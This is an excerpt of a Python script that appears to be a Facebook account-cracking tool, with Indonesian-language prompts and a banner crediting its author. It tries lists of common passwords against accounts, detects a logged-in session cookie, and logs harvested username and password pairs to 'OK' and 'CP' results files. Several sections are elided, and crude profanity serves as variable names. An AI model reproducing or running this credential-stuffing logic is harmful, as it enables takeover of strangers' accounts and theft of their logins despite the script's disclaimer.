...
""")
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : Hassan Baloch         {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +92*******       {N}║")
    print(f"║{P}[{H}•{P}] Github    : Tech-Hassan {N}  ║")
    ...
    print(f"║{P}[{H}•{P}] SC Version: V-1.1({K} Hassan ars {P})            {N}║")
    print("╚════════════════════════════════════════╝")
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY MR™HassanMR™HassanSC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[MR-Hassan-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[MR™Hassan-CP] ", ""), titid[1])
...
def login_token():
    ...
    try:
        ...
        jalan(' [%s!%s] Please use this sc properly, we are not responsible if this sc is misused...\n [%s•%s] WARNING : DILARANG MEMPERJUAL BELIKAN USERNAME & PASSWORD SC MR™Hassan.'%(M,N,H,N));time.sleep(3)
...
def moch_yayan():
    ...
    if pepek == '':
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[MR™Hassan-OK] ","\x1b[1;92m[MR™Hassan-OK] ").replace("[MR™Hassan-CP] ", "\x1b[1;93m[MR™Hassan-CP] ")
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[MR™Hassan-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[MR™Hassan-CP] {user} • {pasw}\n")
        ...
        open('results/INVALID-OK.txt', 'a').write(f"[MR™Hassan-CP] {user} • {pasw}\n")
...
class __crack__:
    ...
    def plerr(self,id):
        ...
        if ___yayanganteng___ in ('raraY', 'raray'):
            ...
            print(' %s[%s!%s] Use %sKOMMA%s for separator\n [%s•%s] Example : %sMR™Hassan123%s,%ssayang%s,%sbismillah'%(N,M,N,H,N,H,N,H,N,H,N,H))
            while True:
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[MR™Hassan-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
